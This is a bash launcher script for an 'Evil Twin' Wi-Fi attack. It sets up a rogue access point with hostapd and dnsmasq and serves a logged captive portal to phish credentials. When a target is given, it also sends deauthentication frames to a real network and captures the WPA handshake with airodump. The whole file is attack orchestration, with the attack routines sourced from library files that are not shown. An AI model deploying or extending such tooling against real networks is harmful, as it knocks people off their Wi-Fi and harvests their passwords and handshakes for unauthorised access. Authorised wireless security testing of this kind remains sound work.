#!/usr/bin/env bash
set -euo pipefail

# Load configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/config.sh"
source "$SCRIPT_DIR/lib/core.sh"
source "$SCRIPT_DIR/attacks/ap.sh"
source "$SCRIPT_DIR/attacks/handshake.sh"

# Override defaults with CLI arguments
SSID="$DEFAULT_SSID"
CHANNEL="$DEFAULT_CHANNEL"
AP_IFACE="$DEFAULT_AP_IFACE"
DEAUTH_IFACE="$DEFAULT_DEAUTH_IFACE"
PORTAL_DIR="$DEFAULT_PORTAL_DIR"
TARGET_BSSID="$DEFAULT_TARGET_BSSID"
TARGET_CHANNEL="$DEFAULT_TARGET_CHANNEL"

# Parse command line arguments
usage() {
    cat <<EOF
Usage: sudo $0 [OPTIONS]

Options:
    --ssid <name>              SSID for the fake AP (default: $DEFAULT_SSID)
    --channel <1-13>           Channel for the fake AP (default: $DEFAULT_CHANNEL)
    --ap-iface <iface>         Interface for AP (monitor mode, default: $DEFAULT_AP_IFACE)
    --deauth-iface <iface>     Interface for deauth attacks (monitor mode, default: $DEFAULT_DEAUTH_IFACE)
    --portal-dir <folder>      Directory containing the captive portal (default: $DEFAULT_PORTAL_DIR)
    --target-bssid <mac>       Target AP BSSID for handshake capture
    --target-channel <1-14>    Target AP channel for handshake capture
    -h, --help                 Show this help message

Example:
    sudo $0 --ssid "Test Network" --channel 6 --target-bssid 00:11:22:33:44:55 --target-channel 6
EOF
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --ssid)           SSID="$2"; shift 2 ;;
        --channel)        CHANNEL="$2"; shift 2 ;;
        --ap-iface)       AP_IFACE="$2"; shift 2 ;;
        --deauth-iface)   DEAUTH_IFACE="$2"; shift 2 ;;
        --portal-dir)     PORTAL_DIR="$2"; shift 2 ;;
        --target-bssid)   TARGET_BSSID="$2"; shift 2 ;;
        --target-channel) TARGET_CHANNEL="$2"; shift 2 ;;
        -h|--help)        usage; exit 0 ;;
        *) echo "Unknown argument: $1"; usage; exit 1 ;;
    esac
done

# Expand tilde in portal directory path
PORTAL_DIR="${PORTAL_DIR/#\~/$HOME}"

# Check prerequisites
check_root
check_dependencies
validate_directory "$PORTAL_DIR"

# Validate interfaces
validate_interface "$AP_IFACE"
validate_interface "$DEAUTH_IFACE"

# If target BSSID is provided, target channel is required
if [[ -n "$TARGET_BSSID" && -z "$TARGET_CHANNEL" ]]; then
    error_exit "Target channel is required when target BSSID is specified"
fi

# If target channel is provided, target BSSID is required
if [[ -n "$TARGET_CHANNEL" && -z "$TARGET_BSSID" ]]; then
    error_exit "Target BSSID is required when target channel is specified"
fi

# Set up working directory
WORKDIR="$(mktemp -d /tmp/evil_twin.XXXXXX)"
log "Working directory: $WORKDIR"

# Set up trap for cleanup
setup_trap

# Set up AP interface
setup_interface "$AP_IFACE" "$AP_IP/24"

# Create configuration files
HOSTAPD_CONF="$WORKDIR/hostapd.conf"
DNSMASQ_CONF="$WORKDIR/dnsmasq.conf"
HTTP_LOG="$WORKDIR/http.log"
HANDSHAKE_FILE="$WORKDIR/handshake"

# Create hostapd configuration
create_hostapd_conf "$HOSTAPD_CONF" "$AP_IFACE" "$SSID" "$CHANNEL"

# Create dnsmasq configuration
create_dnsmasq_conf "$DNSMASQ_CONF" "$AP_IP" "$AP_DHCP_START" "$AP_DHCP_END" "$AP_DHCP_LEASE"

# Start services
start_hostapd "$HOSTAPD_CONF" "$WORKDIR/hostapd.pid"
start_dnsmasq "$DNSMASQ_CONF" "$AP_IFACE" "$WORKDIR/dnsmasq.pid"
start_http_server "$PORTAL_DIR" "$AP_IP" "$HTTP_LOG" "$WORKDIR/http.pid"

# Start handshake capture if target is specified
if [[ -n "$TARGET_BSSID" && -n "$TARGET_CHANNEL" ]]; then
    start_handshake_capture "$DEAUTH_IFACE" "$TARGET_BSSID" "$TARGET_CHANNEL" "$HANDSHAKE_FILE" "$WORKDIR/airodump.pid"
    start_deauth "$DEAUTH_IFACE" "$TARGET_BSSID" "$TARGET_CHANNEL"
fi

# Display information
log "Evil Twin attack is running"
log "SSID: $SSID"
log "Channel: $CHANNEL"
log "AP Interface: $AP_IFACE"
log "Deauth Interface: $DEAUTH_IFACE"
log "AP IP: $AP_IP"
log "Portal Directory: $PORTAL_DIR"

if [[ -n "$TARGET_BSSID" ]]; then
    log "Target BSSID: $TARGET_BSSID"
    log "Target Channel: $TARGET_CHANNEL"
    log "Handshake file: $HANDSHAKE_FILE-01.cap"
fi

log "Press Ctrl+C to stop and clean up"

# Wait indefinitely
while true; do
    sleep 60
done